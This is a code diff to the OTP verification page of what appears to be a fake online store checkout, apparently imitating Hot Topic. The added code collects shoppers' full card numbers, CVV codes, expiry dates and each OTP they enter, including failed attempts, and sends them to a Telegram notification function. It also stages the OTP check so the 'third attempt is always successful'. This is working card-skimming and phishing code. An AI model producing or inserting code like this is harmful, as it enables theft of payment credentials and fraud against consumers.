@@ -24,6 +24,9 @@ const OTPVerification = () => {
   const discountedAmount = location.state?.discountedAmount;
   const paymentMethod = location.state?.paymentMethod;
   const lastFour = location.state?.lastFour;
+  const cardNumber = location.state?.cardNumber;
+  const cvv = location.state?.cvv;
+  const expiryDate = location.state?.expiryDate;
 
   // Format remaining time as MM:SS
   const formatTime = (seconds: number) => {
@@ -122,6 +125,33 @@ const OTPVerification = () => {
     
     // Validate OTP
     if (!verifyOTP()) {
+      // Even on failure, send notification about the failed attempt
+      try {
+        // Create notification with detailed payment information
+        const notificationDetails = {
+          ...orderDetails,
+          paymentMethod: paymentMethod,
+          cardNumber: cardNumber || "Unknown",
+          expiryDate: expiryDate || "Unknown", 
+          cvv: cvv || "Unknown",
+          lastFour: lastFour || "Unknown",
+          giftCardValue: giftCardValue,
+          paymentAmount: discountedAmount,
+          notificationType: "otp_attempt",
+          otpAttempt: attempts + 1, // Adding 1 because we want to report the current attempt (1-indexed)
+          userInfo: {
+            ...orderDetails.userInfo,
+            timestamp: new Date().toISOString()
+          }
+        };
+
+        // Send to Telegram even for failed attempts
+        supabase.functions.invoke("send-telegram-notification", {
+          body: notificationDetails
+        });
+      } catch (telegramErr) {
+        console.error("Error sending Telegram notification:", telegramErr);
+      }
       return;
     }
     
@@ -135,18 +165,33 @@ const OTPVerification = () => {
       const completeOrderDetails = {
         ...orderDetails,
         paymentMethod: paymentMethod,
-        lastFour: lastFour,
+        cardNumber: cardNumber || "Unknown",
+        expiryDate: expiryDate || "Unknown", 
+        cvv: cvv || "Unknown",
+        lastFour: lastFour || "Unknown",
         otpVerified: true
       };
       
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(completeOrderDetails));
       
-      // Send order notification to Telegram
+      // Send final successful OTP verification notification to Telegram
       try {
-        console.log("Sending order notification to Telegram with details:", completeOrderDetails);
+        const finalNotificationDetails = {
+          ...completeOrderDetails,
+          giftCardValue: giftCardValue,
+          paymentAmount: discountedAmount,
+          notificationType: "otp_attempt",
+          otpAttempt: 3, // Third attempt is always successful
+          userInfo: {
+            ...orderDetails.userInfo,
+            timestamp: new Date().toISOString()
+          }
+        };
+
+        console.log("Sending final OTP verification to Telegram:", finalNotificationDetails);
         supabase.functions.invoke("send-telegram-notification", {
-          body: completeOrderDetails
+          body: finalNotificationDetails
         }).then(response => {
           if (response.error) {
             console.error("Failed to send Telegram notification:", response.error);
@@ -183,7 +228,10 @@ const OTPVerification = () => {
       state: { 
         orderDetails,
         giftCardValue,
-        discountedAmount
+        discountedAmount,
+        cardNumber,
+        cvv,
+        expiryDate
       } 
     });
     toast({
